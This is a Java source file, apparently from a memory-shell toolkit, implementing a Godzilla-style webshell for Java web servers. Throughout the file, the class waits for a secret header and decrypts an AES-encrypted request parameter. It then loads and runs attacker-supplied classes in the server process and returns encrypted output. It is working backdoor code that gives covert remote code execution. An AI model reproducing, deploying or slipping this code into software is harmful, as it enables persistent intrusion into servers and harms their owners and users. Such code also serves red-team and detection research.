package com.reajason.javaweb.memshell.shelltool.godzilla;

import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.Key;

/**
 * @author ReaJason
 */
public class Godzilla extends ClassLoader {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    public Godzilla() {
    }

    public Godzilla(ClassLoader z) {
        super(z);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrap(args[0], "request");
        Object response = unwrap(args[1], "response");
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] data = base64Decode(parameter);
                data = this.x(data, false);
                Object session = request.getClass().getMethod("getSession").invoke(request);
                Object cache = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
                if (cache == null) {
                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, (new Godzilla(Thread.currentThread().getContextClassLoader())).defineClass(data, 0, data.length));
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) cache).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    f.equals(data);
                    f.toString();
                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                    writer.write(md5.substring(0, 16));
                    writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    writer.write(md5.substring(16));
                }
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Class<?> cipherClass = classLoader.loadClass("javax.crypto.Cipher");
        Class<?> secretKeySpecClass = classLoader.loadClass("javax.crypto.spec.SecretKeySpec");
        Constructor<?> constructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
        Method initMethod = cipherClass.getMethod("init", int.class, Key.class);
        Object c = cipherClass.getMethod("getInstance", String.class).invoke(null, "AES");
        initMethod.invoke(c, m ? 1 : 2, constructor.newInstance(key.getBytes(), "AES"));
        Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
        return ((byte[]) doFinalMethod.invoke(c, s));
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj, String fieldName) {
        try {
            return getFieldValue(obj, fieldName);
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException();
    }
}